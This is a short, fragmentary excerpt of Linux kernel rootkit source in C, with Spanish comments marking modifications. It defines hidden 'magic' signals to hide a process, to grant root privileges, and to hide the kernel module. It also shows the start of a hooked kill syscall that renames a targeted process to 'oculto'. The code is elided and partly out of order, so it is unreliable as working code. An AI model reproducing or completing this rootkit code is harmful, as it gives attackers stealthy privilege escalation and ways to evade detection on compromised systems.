...
// CAMBIO: Definición personalizada de flag para procesos invisibles
...
#if LINUX_VERSION_CODE > KERNEL_VERSION(4, 16, 0)
asmlinkage int
// CAMBIO: Señales mágicas para funcionalidades especiales
#define SIGINVIS   64  // Señal para ocultar o mostrar proceso
#define SIGSUPER   63  // Señal para convertirse en root
#define SIGMODINVIS 62 // Señal para ocultar el módulo
...
hacked_kill(pid_t pid, int sig)
{
	...
	struct task_struct *task;
	switch (sig) {
		//Cambio: cambiar el nombre del proceso en vez de ocultarlo 
		case SIGINVIS:
			if ((task = find_task(pid)) == NULL)
				return -ESRCH;
			strncpy(task->comm, "oculto", sizeof(task->comm) - 1);
